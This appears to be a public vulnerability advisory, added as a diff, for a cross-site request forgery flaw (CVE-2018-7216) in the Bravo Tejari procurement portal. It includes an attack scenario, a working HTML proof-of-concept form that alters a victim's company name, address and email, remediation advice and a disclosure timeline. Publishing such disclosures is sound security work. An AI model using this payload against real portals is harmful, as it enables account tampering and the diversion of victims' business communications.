@@ -1,0 +1,98 @@
+Exploit Title: Bravo Tejari Web Portal-CSRF
+CVE-ID: CVE-2018-7216
+Vulnerability Type: Cross Site Request Forgery (CSRF)
+Vendor of Product: Tejari
+Affected Product Code Base: Bravo Solution
+Affected Component: Web Interface Management.
+Attack Type: Local - Authenticated
+Impact: Unauthorised Access
+Category: WebApps
+Author: Arvind V.
+Author Social: @Find_Arvind
+
+Vulnerability Type: Cross Site Request Forgery (CSRF)
+Vendor of Product: Tejari
+Affected Product Code Base: Bravo Solution
+Affected Component: Web Interface Management.
+Attack Type: Local - Authenticated
+Impact: Unauthorised Access
+
+Product description:
+Bravo Tejari is a strategic procurement platform that enables organizations
+to generate more value, influence innovation and reduce risk powered by a
+unique supplier-centered approach that integrates supplier lifetime value
+throughout the entire procurement process
+
+Attack Scenario:
+The Web Interface of the Bravo Tejari procurement portal does not use
+random tokens to block any kind of forged requests. An atacker can take
+advantage of this scenario and create a forged request to edit user account
+details like name, address of the company/individual, email address etc. He
+then uses social engineering techniques to target specific individuals
+whose account details he would like to change. He simply sends the link and
+tricks the user into clicking the forged http request. The request is
+executed and user account details are changed without his knowledge.
+
+Proof of Concept Code:
+Forged HTTP Request used by the attacker:
+
+<html>
+    <body>
+    <form action="https://XXXX.XXXX.com/esop/toolkit/profile/regData.do"
+method="POST">
+      <input type="hidden" name="userAct" value="confirmData" />
+      <input type="hidden" name="from" value="registration&#95;data" />
+      <input type="hidden" name="actionNumber" value="0" />
+      <input type="hidden" name="companyExtStatusCode" value="31" />
+      <input type="hidden" name="companyExtStatusNote" value="" />
+      <input type="hidden" name="hideCompany" value="false" />
+      <input type="hidden" name="companyName"
+value="XYZ&#32;COMPUTER&#32;SYSTEMS&#32;FZ&#32;LLC" />
+      <input type="hidden" name="companyAddress"
+value="Dubai&#32;internet&#32;city&#44;&#32;DUBAI" />
+      <input type="hidden" name="companyCity" value="DUBAI" />
+      <input type="hidden" name="companyCountry" value="AE" />
+      <input type="hidden" name="companyProvince" value="Dubai" />
+      <input type="hidden" name="companyZip" value="25703" />
+      <input type="hidden" name="companyPhone" value="43918600" />
+      <input type="hidden" name="companyFax" value="" />
+      <input type="hidden" name="companyEmail"
+value="XYZ&#46;v&#64;XYZ&#46;com" />
+      <input type="hidden" name="companyWebSite" value="" />
+      <input type="hidden" name="companyLegalStructure" value="" />
+      <input type="hidden" name="companyAddress2" value="" />
+      <input type="hidden" name="companyFiscalCode" value="215703" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+Impact:
+The affected product is a procurement portal and so all communication
+regarding the contract lifecycle process is sent to user details provided
+on the portal. If this vulnerability is sucessfully exploited, the attacker
+will be able to change these details which will potentially affect the
+victim's business.
+
+Recommendation:
+Ensure that all sensitive CRUD Operations are appropriately protected with
+random tokens. Alternatively, the sensitive operations should also have an
+authentication layer to confirm user verification.
+
+References:
+http://seclists.org/fulldisclosure/2018/Feb/44
+https://packetstormsecurity.com/files/146409/Tejari-Cross-Site-Request-Forgery.html
+
+https://www.securityfocus.com/archive/1/541782/30/0/threaded
+
+Credit: Arvind Vishwakarma
+http://ultimateone1.blogspot.ae/
+
+
+
+Vulnerability Timeline:
+12th December 2017 – Vulnerability Discovered
+23rd December 2017 – Contacted Vendor – No Response
+7th January 2018 – Contacted Vendor again – No Response
+15th February 2018 – Vulnerability Disclosed
